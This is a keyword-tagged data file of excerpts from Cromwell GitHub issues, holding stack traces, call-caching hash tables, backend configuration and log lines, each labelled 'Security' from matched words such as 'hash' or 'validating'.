Security,"a:486); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply$mcZ$sp(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at scala.util.Try$.apply(Try.scala:192); at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:64); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:95); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:138); at cromwell.backend.impl.jes.io.package$.buildFilesystem(package.scala:26); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:18); at cromwell.backend.impl.jes.JesInitializationActor.<init>(JesInitializationActor.scala:43); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); ```. The two problem actors here are JesAsyncBackendJobExecutionActor and JesInitializationActor. JobPreparationActor also triggers a similar stack trace, but it's using the slow-actor-dispatcher so this doesn't adversely impact submissions. Moving JesAsyncBackendJobExecutionActor and JesInitializationActor to slow-actor-dispatcher as well enabled me to submit up to 50 workflows immediately (I didn't try any more beyond this). The auth / filesystem code was heavily reworked in #702 after 0.19_hotfix was branched. There's a known issue with GCS filesystems not being reused #813 and it looks like there could be another issue with validating credentials excessively.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798:3049,validat,validating,3049,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798,1,['validat'],['validating']
Security,a:539); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:980); at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1363); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1391); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1375); at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:563); at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185); at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.storage.spi.DefaultStorageRpc.get(DefaultStorageRpc.java:320); ... 31 more; Caused by: jav,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782:4253,secur,security,4253,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782,1,['secur'],['security']
Security,"a:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExec",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:1926,validat,validation,1926,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['validat'],['validation']
Security,"ab48bc10677|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |5de04",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:5680,hash,hashes,5680,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"abel-key = ""network-key""; # auth = ""application-default""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # batch-timeout = 7 days. genomics {; auth = ""cromwell-service-account""; location: ""${region}""; compute-service-account = ""${compute_service_account}"". # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration turns it on for files of 150M or larger.; parallel-composite-upload-threshold=""150M""; }. filesystems {; gcs {; auth = ""cromwell-service-account"". # For billing; project = ""${billing_project}"". caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""copy""; }. }; http {}; }. # Important!! Some of the workflows take an excessive amount of time to run; batch-timeout = 28 days. default-runtime-attributes {; cpu: 1; failOnStderr: false; continueOnReturnCode: 0; memory: ""2 GB""; bootDiskSizeGb: 10; # Allowed to be a String, or a list of Strings; disks: ""local-disk 10 SSD""; noAddress: true; preemptible: 0; docker: ""ubuntu:latest""; }. virtual-private-cloud {; network-name = ""${private_network}""; subnetwork-name = ""${private_subnet}""; }; }; }; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7238:3405,access,accessible,3405,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7238,1,['access'],['accessible']
Security,"abort.; # If on the next scan an 'Aborting' status is found for a workflow that has an entry in this cache, Cromwell will not ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires from the docker hashes cache and needs to be fetched again; #cache-entry-ttl = ""20 minutes"". # Maximum number of elements to be kept in the cache. If the limit is reached, old elements will be removed from the cache; #cache-size = 200. # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub, gcr, gar, quay; #method = ""remote""; enabled = ""false""; }; }. # Here is where you can define the backend providers that Cromwell understands.; # The default is a local provider.; # To add additional backend providers, you should copy paste additional backends; # of interest that you can find in the cromwell.example.backends folder; # folder at https://www.github.com/broadinstitute/cromwell; # Other backend providers include SGE, SLURM, Docker, udocker, Singularity. etc.; # Don't forget you will need to customize them for your particular use case.; backend {; # Override the default backend.; default = slurm. # The list of providers.; providers {; # Copy paste the contents of a backend provider in this section; # Examples in cromwell.example.backends include:; # LocalExample: What you should use if you want to define a n",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:4434,hash,hashes,4434,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['hash'],['hashes']
Security,ace$lzycompute(ConfigInitializationActor.scala:37); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:37); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:40); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:39); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:49); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:48); cromwell_1 | 	at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:78); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$class.validateRuntimeAttributes(BackendWorkflowInitializationActor.scala:121); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$class.initSequence(BackendWorkflowInitializationActor.scala:154); cromwell_1 | 	at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:42); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$2.apply(BackendWorkflowInitializationActor.scala:146); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$2.apply(BackendWorkflowInitializationActor.scala:146); cromwell_1 | 	at cromwell.backend.BackendLifecycleActor$class.performActionThenRespond(BackendLifecycleActor.scala:44); cromwell_1 | 	at cromwell.backend.standard.StandardInitializationActor.performActionThenRespond(StandardInitializationActor.scala:42); cromwell_1 | 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.applyOrElse(BackendWorkflowIn,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2284:3810,validat,validateRuntimeAttributes,3810,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2284,1,['validat'],['validateRuntimeAttributes']
Security,"aching with read = true and write = true; [2022-12-15 21:28:23,70] [info] BT-322 788d8048:main.all_qced_sample_lists:5:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:28:23,71] [info] BT-322 788d8048:main.all_qced_sample_lists:3:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:28:23,72] [info] BT-322 788d8048:main.all_qced_sample_lists:4:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:28:23,72] [info] BT-322 788d8048:main.all_qced_sample_lists:0:1 is eligible for call caching with read = true and write = true; [2022-12-15 21:28:23,78] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:5:1-20000000037 [788d8048main.all_qced_sample_lists:5:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,78] [info] BT-322 788d8048:main.all_qced_sample_lists:5:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 0EDB33C059ED489B1F78F3502B7DB8AC.; [2022-12-15 21:28:23,78] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:5:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:23,79] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:1:1-20000000039 [788d8048main.all_qced_sample_lists:1:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,79] [info] BT-322 788d8048:main.all_qced_sample_lists:1:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = DC6FF6846E1CC843B0D79723739936B2.; [2022-12-15 21:28:23,79] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:1:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:42421,hash,hashes,42421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"aching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:backend name|2267EF43AEF6BB551F414FEC2390F68A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:backend name|2267EF43AEF6BB551F414FEC2390F68A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:effectiveCallCach",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:6169,hash,hashes,6169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,aching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:3951,hash,hashes,3951,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"ackend {; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; run-in-background = true; runtime-attributes = ""String? docker Int? max_runtime = 2""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". # Root directory where Cromwell writes job results. This directory must be; # visible and writeable by the Cromwell process as well as the jobs that Cromwell; # launches.; root: ""cromwell-executions"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]. caching {; duplication-strategy: [; ""soft-link""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; hashing-strategy: ""path"". # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; # If false or the md5 does not exist, will proceed with the above-defined hashing strategy.; check-sibling-md5: false; }; }; }; }; }; }; }. database {; db.url = ""jdbc:mysql://mysql-db/cromwell_db?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true""; db.user = ""cromwell""; db.password = ""cromwell""; db.driver = ""com.mysql.cj.jdbc.Driver""; profile = ""slick.jdbc.MySQLProfile$""; db.connectionTimeout = 15000; }; ```. and here is my cormwell dockerfile:. ```; FROM broadinstitute/cromwell:develop. RUN git clone https://github.com/vishnubob/wait-for-it.git; RUN mkdir cromwell-working-dir; WORKDIR cromwell-working-dir. COPY ./app-config /app-config. ENTRYPOINT [""/bin/sh"", ""-c""]; ```. when i submit a wdl did not use docker it was ok. but when i submit a wdl need to use docker, a error apear.; ```; /cromwell-working-di",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7006:2009,hash,hashing-strategy,2009,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7006,1,['hash'],['hashing-strategy']
Security,"ackend.scala:46); at slick.jdbc.JdbcBackend$DatabaseDef.createSession(JdbcBackend.scala:37); at slick.basic.BasicBackend$DatabaseDef.acquireSession(BasicBackend.scala:250); at slick.basic.BasicBackend$DatabaseDef.acquireSession$(BasicBackend.scala:249); at slick.jdbc.JdbcBackend$DatabaseDef.acquireSession(JdbcBackend.scala:37); at slick.basic.BasicBackend$DatabaseDef$$anon$3.run(BasicBackend.scala:275); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Caused by: org.postgresql.util.PSQLException: FATAL: sorry, too many clients already; at org.postgresql.core.v3.ConnectionFactoryImpl.doAuthentication(ConnectionFactoryImpl.java:514); at org.postgresql.core.v3.ConnectionFactoryImpl.tryConnect(ConnectionFactoryImpl.java:141); at org.postgresql.core.v3.ConnectionFactoryImpl.openConnectionImpl(ConnectionFactoryImpl.java:192); at org.postgresql.core.ConnectionFactory.openConnection(ConnectionFactory.java:49); at org.postgresql.jdbc.PgConnection.<init>(PgConnection.java:195); at org.postgresql.Driver.makeConnection(Driver.java:454); at org.postgresql.Driver.connect(Driver.java:256); at com.zaxxer.hikari.util.DriverDataSource.getConnection(DriverDataSource.java:136); at com.zaxxer.hikari.pool.PoolBase.newConnection(PoolBase.java:369); at com.zaxxer.hikari.pool.PoolBase.newPoolEntry(PoolBase.java:198); at com.zaxxer.hikari.pool.HikariPool.createPoolEntry(HikariPool.java:467); at com.zaxxer.hikari.pool.HikariPool.access$100(HikariPool.java:71); at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:706); at com.zaxxer.hikari.pool.HikariPool$PoolEntryCreator.call(HikariPool.java:692); at java.util.concurrent.FutureTask.run(FutureTask.java:266); ... 3 common frames omitted; ```. </details>. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6208:4813,access,access,4813,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6208,2,"['PASSWORD', 'access']","['PASSWORDS', 'access']"
Security,"ackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:1:1-20000000039 [788d8048main.all_qced_sample_lists:1:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,79] [info] BT-322 788d8048:main.all_qced_sample_lists:1:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = DC6FF6846E1CC843B0D79723739936B2.; [2022-12-15 21:28:23,79] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:1:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:23,80] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:3:1-20000000035 [788d8048main.all_qced_sample_lists:3:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,80] [info] BT-322 788d8048:main.all_qced_sample_lists:3:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 262BA6F0AB83375414FCD228C0CC6E47.; [2022-12-15 21:28:23,80] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:3:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:23,81] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.all_qced_sample_lists:2:1-20000000034 [788d8048main.all_qced_sample_lists:2:1]: Unrecognized runtime attribute keys: shortT; ask, dx_timeout; [2022-12-15 21:28:23,81] [info] BT-322 788d8048:main.all_qced_sample_lists:2:1 cache hit copying success with aggregated hashes: initial = 8BB8C81C27BFD2533FC9743A70F55DB1, file = 110EC9F4C25BC9902A0E5B3B8EAB2725.; [2022-12-15 21:28:23,81] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.all_qced_sample_lists:2:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:43789,hash,hashes,43789,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
